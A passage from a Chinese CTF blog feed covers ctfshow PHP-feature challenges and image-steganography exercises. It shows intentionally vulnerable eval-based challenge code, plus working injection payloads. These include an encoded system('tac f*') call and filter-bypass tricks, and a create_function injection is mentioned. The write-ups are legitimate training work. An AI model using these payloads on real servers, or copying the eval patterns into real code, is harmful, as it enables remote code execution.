punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这次似乎把所有的运算符都过滤了，我们该怎么办呢？可以使用三目运算符，因为？没有被过滤</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token number">1</span><span class="token operator">?</span>phpinfo<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>payload为</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>v1<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>v2<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>v3<span class="token operator">=</span><span class="token operator">?</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token operator">%</span><span class="token number">8</span>C<span class="token operator">%</span><span class="token number">86</span><span class="token operator">%</span><span class="token number">8</span>C<span class="token operator">%</span><span class="token number">8</span>B<span class="token operator">%</span><span class="token number">9</span>A<span class="token operator">%</span><span class="token number">92</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token operator">%</span><span class="token number">8</span>B<span class="token operator">%</span><span class="token number">9</span>E<span class="token operator">%</span><span class="token number">9</span>C<span class="token operator">%</span><span class="token constant">DF</span><span class="token operator">%</span><span class="token number">99</span><span class="token operator">%</span><span class="token constant">D5</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="web146"><a href="#web146" class="headerlink" title="web146"></a>web146</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-z]|[0-9]|\@|\!|\:|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\>|\*|\/|\^|\#|\"/i'</span><span class="token punctuation">,</span> <span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'get out hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$code</span> <span class="token operator">=</span>  <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"return <span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span>;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span> = "</span><span class="token operator">.</span><span class="token variable">$code</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>分号被过滤，我们可以使用逻辑运算符进行组合，比如</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"return 1==phpinfo()||1;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>有一说一，挺离谱的。啥原理</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">payload<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="web147"><a href="#web147" class="headerlink" title="web147"></a>web147</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ctfshow</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^[a-z0-9_]*$/isD'</span><span class="token punctuation">,</span><span class="token variable">$ctfshow</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$ctfshow</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'show'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>考察点：什么特殊符号添加在函数名头部或者尾部，不会影响函数的调用。此外还有create_function的代码注入。详细可见</p><p>一开始硬是没看懂。</p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Web安全 </tag>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2021/10/21/hello-world/"/>
      <url>/2021/10/21/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow misc入门</title>
      <link href="/2021/10/21/ctfshow-misc-ru-men/"/>
      <url>/2021/10/21/ctfshow-misc-ru-men/</url>
      
        <content type="html"><![CDATA[<h2 id="misc3"><a href="#misc3" class="headerlink" title="misc3"></a>misc3</h2><p>发现是一个bpg文件，bpg是一种特殊的压缩方式，无法直接查看，所以需要特殊工具查看。</p><p>使用指令 bpgview.exe misc3.bpg</p><h2 id="misc4"><a href="#misc4" class="headerlink" title="misc4"></a>misc4</h2><h3 id="png"><a href="#png" class="headerlink" title="png"></a>png</h3><p>我们通过winhex分别打开文件</p><p>看到text1的二进制信息，我们可以看出这个png文件。</p><p><img src="pngHeader.png"></p><h3 id="jpg"><a href="#jpg" class="headerlink" title="jpg"></a>jpg</h3><p>如何判断是jpg文件。</p><p>二进制形式打开文件，文件开始字节为FF D8，文件结束两字节为FF D9。则初步判定文件为jpeg。</p><p>jpeg的SOI（start of image） 为ff d8，EOD（end of image）为ff d9。</p><p>头部：</p><p><img src="jpgHeader.png"></p><p>尾部：</p><p><img src="jpgLaster.png"></p><p>所以这一题我们，我们继续改后缀。</p><h3 id="bmp"><a href="#bmp" class="headerlink" title="bmp"></a>bmp</h3><blockquote><p>一共14字节，下面逐个解释。<br>  0-1：bfType，表示文件类型，BMP格式的文件这两个字节是0x424D，10进制就是19778，字符显示就是‘BM’；<br>  2-5：bfSize，表示文件的大小，这里的是0x0004B436，十进制是308278，也就是301kb，检查文件信息，验证正确；<br>  6-7：bfReserved1，保留位，必须设置为0；<br>  8-9：bfReserved2，保留位，必须设置为0；<br>  a-d：bfOffBits，4字节的偏移，表示从文件头到位图数据的偏移，这里是0x00000436，十进制是1078，后面会做验证；</p></blockquote><p><img src="bmpHeader.png"></p><p>修改bmp格式即可。</p><h3 id="gif"><a href="#gif" class="headerlink" title="gif"></a>gif</h3><blockquote><p>GIF的前6个字节内容是GIF的署名和版本号。我们可以通过前3个字节判断文件是否为GIF格式，后3个字节判断GIF格式的版本。</p></blockquote><p><img src="gifHeader.png"></p><h3 id="tif"><a href="#tif" class="headerlink" title="tif"></a>tif</h3><blockquote><p>一共8个字节</p></blockquote><p>  0-1字节为II或MM，前者表示小字节在前（4D4D），后者表示大字节在前（4949）。</p><p>  2-3字节为特定的数值42</p><p>  4-7字节为第一个图像文件目录IFD的偏移量（必须是2的倍数）</p><p><img src="tifHeader.png"></p><h3 id="webp"><a href="#webp" class="headerlink" title="webp"></a>webp</h3><p><img src="webpHeader.png"></p><blockquote><p>RIFF文件的基本元素是一个块。它包括了Chunk FourCC 、 Chunk Size、 Chunk Payload三部分 。其中Chunk FourCC是一个32位ASCII编码的块文件的唯一标识。  Chunk Size则代表该块文件的大小， Chunk Payload则是数据有效承载，如果“块大小”为奇数，则添加一个填充字节（应为0）。<br>  我们常用ChunkHeader(‘ABCD’)来描述RIFF文件，这里ABCD则是FourCC单个块，则该元素大小为8个字节。<br>  1，’RIFF’: 32 bits：32位 ASCII字符“ R”，“ I”，“ F”，“ F”。<br>  2，文件大小，32位，从偏移量8开始的文件大小，以字节为单位。此字段的最大值为2 ^ 32减去10个字节，因此，整个文件的大小最多为4GiB减去2个字节。<br>  3，’WEBP’: 32 bits：ASCII字符“ W”，“ E”，“ B”，“ P”。</p></blockquote><h2 id="misc5"><a href="#misc5" class="headerlink" title="misc5"></a>misc5</h2><p>使用winhex打开后，发现在文件的最后存在flag</p><h2 id="misc6"><a href="#misc6" class="headerlink" title="misc6"></a>misc6</h2><p>在文件的中间位置。</p><h2 id="misc7"><a href="#misc7" class="headerlink" title="misc7"></a>misc7</h2><p>可以用notepad++打开然后，查找ctf，便可以发现flag。</p><h2 id="misc8"><a href="#misc8" class="headerlink" title="misc8"></a>misc8</h2><p>可以使用kali工具binwalk或者foremost来分离。这里，我先使用winhex进行分离。首先，我们可以发现，在文件中有着89 50 4e 47开头的另一个png文件。所以我们在此，alt+1选中，再到文件尾部alt+2，之后与edit中选择创建新文件即可看到图片中flag。</p><p><img src="misc8.png"></p><h2 id="misc9"><a href="#misc9" class="headerlink" title="misc9"></a>misc9</h2><p>这里可以使用010editor</p><p>也可以用misc6中的方式。所以啥叫图片块。</p><h2 id="misc10"><a href="#misc10" class="headerlink" title="misc10"></a>misc10</h2><p>binwalk</p><p>我们可以使用binwalk直接进行分解。？但是啥原理。</p><p>根据8神本人所说，他将flag伪装成为IDAT块中zlib模块，并加上长度位，标志位，以及CRC校验位。而binwalk能够检测出是因为，他检测到了 zlib标志位并将其分离出来。</p><h2 id="misc11"><a href="#misc11" class="headerlink" title="misc11"></a>misc11</h2><p>删去第一个IDAT块。使用tweakpng-1.4.6</p><blockquote><p>PNGDebugger.exe  ../test/example.png</p></blockquote><p>010editor</p><h2 id="misc12"><a href="#misc12" class="headerlink" title="misc12"></a>misc12</h2><p>删除前8个。IDAT块。</p><h2 id="misc13"><a href="#misc13" class="headerlink" title="misc13"></a>misc13</h2><p>根据提示，显示flag在文件尾，我们可以在文件尾发现可疑字符串。注意，下面也有一串类似的，但是它是假的。</p><p><img src="misc13.png"></p><p>可以看出他每隔一个字符就为一个正确的flag，所以我们可以每隔一个取一个字符，下面为脚本。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">Hex <span class="token operator">=</span> <span class="token string">"631A74B96685738668AA6F4B77B07B216114655336A5655433346578612534DD38EF66AB35103195381F628237BA6545347C3254647E373A64E465F136FA66F5341E3107321D665438F1333239E9616C7D"</span>flag <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>Hex<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">+=</span> Hex<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    flag <span class="token operator">+=</span> Hex<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="misc14"><a href="#misc14" class="headerlink" title="misc14"></a>misc14</h2><p>根据提示，不妨猜想图中图，我们查找ffd8即可查找到里面的图，之后就是分离。</p><h2 id="misc15"><a href="#misc15" class="headerlink" title="misc15"></a>misc15</h2><p>winhex打开，就能看到flag。前几次没有看到，以后还是要仔细一些。</p><h2 id="misc16"><a href="#misc16" class="headerlink" title="misc16"></a>misc16</h2><p>binwalk一把梭哈</p><h2 id="misc17"><a href="#misc17" class="headerlink" title="misc17"></a>misc17</h2><p>binwalk没有发现，我们使用zsteg分析一下，<strong>zsteg misc17.png</strong>。发现一串不正常数据，位置为extraData:0。</p><p><img src="misc17-1.png"></p><p>接下来就是将其分解出来，<strong>zsteg -E “extradata:0” misc17.png &gt; 1.txt</strong>。</p><p>最后，使用binwalk提取出图片。</p><h2 id="misc18-20"><a href="#misc18-20" class="headerlink" title="misc18-20"></a>misc18-20</h2><p>使用此网站进行查看：<a href="https://exif.tuchong.com/view/11537682/">https://exif.tuchong.com/view/11537682/</a></p><h2 id="misc21"><a href="#misc21" class="headerlink" title="misc21"></a>misc21</h2><p>使用hex将所得信息进行16进制转化即可</p><h2 id="misc22"><a href="#misc22" class="headerlink" title="misc22"></a>misc22</h2><p>使用magicEXIF打开即可。</p><h2 id="misc23"><a href="#misc23" class="headerlink" title="misc23"></a>misc23</h2><p>提示：flag在时间里。</p><p>使用kali上exif工具查看，此文件的exif信息，然后收集时间并在<a href="https://tool.lu/timestamp/">在线工具</a>查看秒数，从而再如misc16一样即可。</p><h2 id="misc41"><a href="#misc41" class="headerlink" title="misc41"></a>misc41</h2><p>H4ppy Apr1l F001’s D4y！<br>愚人节到了，一群笨蛋往南飞，一会儿排成S字，一会儿排成B字。</p><p>一开始一点思路都没有，看到头部信息不是ffd8改了之后也没啥效果。一看writeup人都傻了，原来关键是F001。我们搜索FF01便可以发现显示结果有隐约的图形规律。所以，我们一点点看就可以写出payload了。</p><p><img src="misc41.png"></p><p>ctfshow{fcbd427caf4a52f1147ab44346cd1cdd}</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>最近参加了个比赛骚操作满满，团体赛各打各的，不允许交流，最后成绩三人的总和。我真的人傻了，因为misc一点不会，而且好入门点，就临时突击一下。之前从来没有了解过，而且时间紧没法仔细写，主要就是用来自己复习一下的。好了，废话不多说，开始总结。</p><p>首先，图片隐写中最简单的就是，直接把flag存放到图片中，仔细一点就能看出来，当然这种题目比赛中肯定不会出。</p><p>然后，我们还可以通过改变后缀，使图片无法解析，从而达到隐藏的目的。这里主要靠查看文件的头部和尾部，比如jpg文件的头部为FFD8、尾部为FFD9，而png文件头部一般为89 50 4e 47。</p><p>之后，我们还遇到了图片中参杂其他文件的情况，这的时候我们通过binwalk -e [图片地址]的形式来对其进行分解。</p><p>除此之外，还有将文件添加多余的IDAT块，这会导致我们的图片显示图片不正确，这里可以用tweakpng-1.4.6进行去除。有时候，也会将flag隐藏在里面，可以使用010Editor进行查看。</p><p>最后，你可以发现基本所有题目都是基于exif的，因而查看exif信息十分重要，我们主要可以通过以下方式。<a href="https://exif.tuchong.com/view/11537682">网站</a>，exiftool。</p><p>如果有缩略图，使用MagicExif即可。</p><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><p>所以，我们遇到这些题目时可以有下面的步骤。首先，winhex打开文件，看一看有无特殊字符，观察一下头部尾部。没啥特殊信息，binwalk，010Editoe， zsteg轮番上阵。都没有啥发现，看一看exif，或者缩略图。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/weixin_45696568/article/details/115261347">ctfshow-Misc入门 图片篇(1-50)</a></p><p><a href="https://www.cnblogs.com/ECJTUACM-873284962/p/8986391.html">详解PNG文件结构</a></p><p><a href="https://blog.csdn.net/u012877472/article/details/50272771">BMP格式详解</a></p><p><a href="https://cloud.tencent.com/developer/article/1155421">gif</a></p><p><a href="https://blog.csdn.net/m1m2m3mmm/article/details/78401523">tif</a></p><p><a href="https://www.cnblogs.com/cr330326/p/12809418.html">webp</a></p>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshowPHP特性-中(111-131)</title>
      <link href="/2021/10/20/ctfshowphp-te-xing-zhong/"/>
      <url>/2021/10/20/ctfshowphp-te-xing-zhong/</url>
      
        <content type="html"><![CDATA[<h2 id="Web111"><a href="#Web111" class="headerlink" title="Web111"></a>Web111</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">getFlag</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token operator">&amp;</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$$v1</span></span> = &amp;<span class="token interpolation"><span class="token variable">$$v2</span></span>;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$$v1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\>/'</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error v1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\>/'</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error v2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ctfshow/'</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>考察点：php超全局变量$GLOBALS的使用</p><p>当我们输出$GLOBALS会将我们定义的所有变量进行输出。可以看下面的例子。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token string double-quoted-string">"string "</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出结果有很多，我们简略的摘取其中一部分。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token punctuation">[</span><span class="token string double-quoted-string">"GLOBALS"</span><span class="token punctuation">]</span><span class="token operator">=></span>  <span class="token operator">*</span><span class="token constant">RECURSION</span><span class="token operator">*</span>  <span class="token punctuation">[</span><span class="token string double-quoted-string">"a"</span><span class="token punctuation">]</span><span class="token operator">=></span>  <span class="token keyword type-declaration">int</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token punctuation">[</span><span class="token string double-quoted-string">"b"</span><span class="token punctuation">]</span><span class="token operator">=></span>  <span class="token keyword type-declaration">int</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>  <span class="token punctuation">[</span><span class="token string double-quoted-string">"c"</span><span class="token punctuation">]</span><span class="token operator">=></span>  <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"string"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到我们定义的变量已经被输出。所以我们想要获得flag，可以将$$v1=$GLOBALS即可。</p><p>payload：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">v1<span class="token operator">=</span>ctfshow<span class="token operator">&amp;</span>v2<span class="token operator">=</span><span class="token constant">GLOBALS</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="Web112"><a href="#Web112" class="headerlink" title="Web112"></a>Web112</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\.\.\/|http|https|data|input|rot13|base64|string/i'</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" 